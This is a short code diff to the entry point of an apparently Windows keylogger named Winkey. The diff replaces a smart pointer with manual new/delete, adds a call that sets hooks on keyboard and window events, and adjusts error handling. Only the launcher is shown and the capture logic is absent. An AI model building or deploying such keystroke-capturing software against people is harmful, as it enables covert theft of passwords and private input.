@@ -1,5 +1,4 @@
 #include "Winkey.hpp"
-#include <memory>
 
 /*
  * Check if the test mode has been set.
@@ -24,26 +23,32 @@ static bool isTestModeSet(int argc, wchar_t *argv[])
 
 int wmain(int argc, wchar_t *argv[])
 {
-    bool isTestMode = isTestModeSet(argc, argv);
+    Winkey  *w = new Winkey();
+    bool    isTestMode = isTestModeSet(argc, argv);
 
     try {
-        auto w = std::make_unique<Winkey>(); // RAII
-
+        // Set the hooks to the window and keyboard events
+        w->setHooks();
         // Run the keylogger
         w->run(isTestMode);
     }
     catch (const WinkeyException &e)
     {
-        if (isTestMode) // Output errors only while testing
+        if (isTestMode)
+        { // Output errors only while testing
             std::cerr << "Error: " << e.what() << std::endl;
-        return 1;
+            delete w;
+            return 1;
+        }
     }
     catch (const std::exception &e)
     {
         if (isTestMode)
             std::cerr << "Error: " << e.what() << std::endl;
+        delete w;
         return 1;
     }
 
+    delete w;
     return 0;
 }
